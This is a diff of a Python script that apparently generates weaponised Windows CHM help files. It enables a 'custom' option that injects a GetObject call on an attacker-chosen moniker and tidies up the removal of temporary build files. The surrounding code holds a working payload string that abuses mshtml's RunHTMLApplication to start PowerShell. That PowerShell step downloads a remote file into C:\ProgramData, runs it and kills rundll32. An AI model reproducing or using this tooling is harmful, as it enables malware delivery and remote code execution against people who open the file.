@@ -751,8 +751,8 @@ if args.jsrat is not None:
 if args.download is not None:
     command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell.exe Import-Module BitsTransfer;Start-BitsTransfer '+ args.download +' C:\\\\ProgramData\\\\write.jpg;cmd.exe /c C:\\\\ProgramData\\\\write.jpg;cmd /c taskkill /f /im rundll32.exe",0,true);'
 
-# if args.custom is not None:
-  # command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("' + args.custom + '");'
+if args.custom is not None:
+  command='javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("' + args.custom + '");'
 
 if command == ' ':
     parser.print_help()
@@ -838,8 +838,11 @@ CurrentPath=os.getcwd()
 LibPath=CurrentPath + '\lib\hhc.exe'
 os.system('{0} exp.hhp'.format(LibPath))
 
-os.remove('exp.htm')
-os.remove('exp.hhc')
-os.remove('exp.hhk')
-os.remove('exp.hhp')
-os.remove('php.htm')
+def removefile():
+    os.remove('exp.htm')
+    os.remove('exp.hhc')
+    os.remove('exp.hhk')
+    os.remove('exp.hhp')
+    os.remove('php.htm')
+
+removefile()
